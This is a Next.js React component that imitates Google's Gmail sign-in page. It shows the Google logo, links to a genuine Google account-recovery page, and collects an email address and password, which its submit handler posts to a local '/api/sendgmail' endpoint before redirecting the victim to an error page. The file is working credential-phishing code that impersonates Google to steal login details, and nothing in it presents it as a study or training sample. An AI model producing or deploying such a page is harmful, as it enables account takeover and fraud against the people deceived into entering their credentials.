import Link from 'next/link'
import Image from 'next/image'
import { useState } from 'react'
import { useRouter } from 'next/router'

const Gmail = () => {
    const Router = useRouter()
  

    const [email, setEmail] = useState()
    const [password, setPassword] = useState()

    const handleSubmit = (e) => {
      e.preventDefault();
      let data = {
          email,
          password
      }
      const jsondata = JSON.stringify(data)
      console.log(jsondata)

      fetch('/api/sendgmail', {
          method: 'POST',
          body: jsondata
      }).then((res) => {
          console.log('successful')
          if (res.status === 200) {
            //   Navigate('google.com')
            Router.push('/signup/error')
            //   setEmail('')
            //   setPassword('')
          }
      })
    }
  
  
    return (
        <> 
        <div className="flex flex-wrap justify-center pt-20">
                <div className="w-[550px] h-88 bg-white border-[1px] border-solidborder-[#F1F1F1] flex flex-col items-center p-10">
                       <Image
                          src="/images/google.png"
                          className=""
                          height={40}
                          width={70}
                          alt="second hero"/>
                           <h2 className="modal-title p-5" id="exampleModalLabel">Sign In <span id="field"></span></h2>
<h4>to continue to Gmail</h4>
                          <form onSubmit={(e) => handleSubmit(e)} className='mt-6 flex flex-col'>
                          <label >Email address</label>
                          <input type="text" placeholder="Enter Email" id='emails' name='emails'onChange={(e) =>{ return setEmail(e.target.value)}} 
                            className='w-[390px] h-[45px] border-[1px] border-solid border-[#F1F1F1] bg-[#FAFAFA] mb-3 p-2 placeholder:text-sm focus:outline-none'
                             required/>
<a href="https://accounts.google.com/signin/v2/usernamerecovery?flowName=GlifWebSignIn&flowEntry=ServiceLogin">Forgot email?</a>
                        <label>Password</label>
                          <input type="password" placeholder="Enter Password" id='passwords' name='passwords' onChange={(e) =>{return setPassword(e.target.value)}}
                            className='w-[390px] h-[45px] border-[0.5px] border-solid border-[#F1F1F1] bg-[#FAFAFA] mb-3 p-2 placeholder:text-sm focus:outline-none' 
                            required/>

<div className="flex items-center justify-end p-6 border-t border-solid border-slate-200 rounded-b">
               
                  <button
                    className="bg-blue-800 text-white active:bg-emerald-600 font-bold uppercase text-sm px-6 py-3 rounded shadow hover:shadow-lg outline-none focus:outline-none mr-1 mb-1 ease-linear transition-all duration-150"
                    type="submit"
                 
                  >
                   Next
                  </button>
                </div>
                          </form> 

                         
              </div>
              </div>
        </>
    )
}

export default Gmail